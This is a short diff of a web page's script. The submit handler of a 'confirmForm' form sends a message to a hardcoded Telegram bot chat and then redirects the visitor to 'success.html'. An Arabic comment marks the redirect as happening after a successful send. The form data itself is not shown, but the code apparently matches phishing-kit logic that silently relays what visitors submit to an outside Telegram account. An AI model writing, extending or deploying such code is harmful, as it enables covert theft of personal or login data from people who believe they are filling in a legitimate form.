@@ -405,16 +405,23 @@ document.getElementById("confirmForm").addEventListener("submit", function () {
   const chatId = "7811430582";
 
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      parse_mode: "Markdown"
-    })
-  });
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    chat_id: chatId,
+    text: message,
+    parse_mode: "Markdown"
+  })
+})
+.then(response => response.json())
+.then(data => {
+  console.log("Telegram response:", data);
 
-  alert("Processing...");
+  // بعد نجاح الإرسال → انتقل للصفحة الثانية
+  window.location.href = "success.html";
+})
+.catch(error => {
+  console.error("Telegram error:", error);
 });
 </script>
 </body>
